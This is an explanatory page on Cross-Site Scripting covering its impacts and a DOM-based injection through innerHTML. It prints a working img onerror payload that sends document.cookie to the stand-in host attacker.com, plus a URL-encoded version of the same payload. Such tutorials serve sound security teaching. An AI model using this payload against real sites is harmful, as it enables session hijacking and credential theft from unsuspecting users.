# Cross-Site Scripting (XSS)

XSS stands for **Cross-Site Scripting**. It occurs when an attacker injects malicious scripts into a website. These scripts are executed on the user's browser, allowing attackers to steal sensitive information such as cookies, session tokens, or credentials.

## How It Works:

1. **Attacker**: Injects a malicious script into a vulnerable website.
2. **User Side**: The script is executed whenever a user visits the infected website. This can lead to data theft, unauthorized actions, and other malicious activities.

## Common Vulnerabilities:

1. **User Session Hijacking**: Attackers can steal session cookies, allowing them to impersonate the user.
2. **Unauthorized Actions**: Attackers can perform actions on behalf of the user, such as sending messages without the user's knowledge.
3. **Keystroke Logging**: Malicious scripts can capture keystrokes, exposing passwords and other sensitive information.
4. **Stealing Critical Information**: Sensitive data, such as personal information and credentials, can be stolen.
5. **Phishing Attacks**: Attackers can use XSS to create fake login pages and trick users into submitting their credentials.

## Example 1 of an XSS Attack:

In a typical development scenario, query parameters are often accessed using JavaScript, such as:

```jsx
new URLSearchParams(window.location.search).get("name");
```

This `name` parameter is then updated in the DOM using `innerHTML`. If proper sanitization isn't applied, an attacker could manipulate the URL to inject a malicious script.

### Example: Malicious Code in Image Tag

```html
<img
  src="does-not-exist"
  onerror="var img = document.createElement('img'); img.src = 'http://attacker.com/cookie?data=' + document.cookie; document.body.appendChild(img);"
/>
```

- In this example, the attacker injects an `<img/>` tag where the `src` points to a non-existent resource.
- When the image fails to load, the `onerror` handler is triggered.
- The attacker creates a new image element, appending the user's cookies to their malicious URL (`http://attacker.com/cookie?data=`) and sends the cookies to the attacker's server.

### Encoded Malicious URL:

To further obfuscate the attack, the attacker can encode the URL using `encodeURIComponent()`:

```jsx
let imgcode =
  "<img src=\"does-not-exist\" onerror=\"var img = document.createElement('img'); img.src = 'http://attacker.com/cookie?data=' + document.cookie; document.body.appendChild(img);\" />";

encodeURIComponent(imgcode);
```

This encoded URL can then be used to execute the XSS attack, stealing user cookies like session tokens and sending them to the attacker's server.
